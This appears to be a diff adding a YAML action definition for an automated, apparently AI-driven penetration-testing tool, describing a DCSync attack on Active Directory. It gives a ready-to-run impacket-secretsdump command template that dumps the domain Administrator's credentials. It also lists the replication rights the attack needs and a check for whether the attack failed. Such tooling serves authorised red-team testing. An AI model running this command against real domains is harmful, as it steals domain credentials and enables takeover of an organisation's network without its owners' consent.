@@ -1,0 +1,17 @@
+name: dcsync
+category: ad
+description: DCSync attack to dump domain credentials
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "impacket-secretsdump '{domain}/{username}:{password}@{target_ip}' -just-dc-user Administrator"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "DCSync replicates credentials via DRSUAPI (GetNCChanges). Requires DS-Replication-Get-Changes + DS-Replication-Get-Changes-All. Dumps individual accounts or full NTDS."
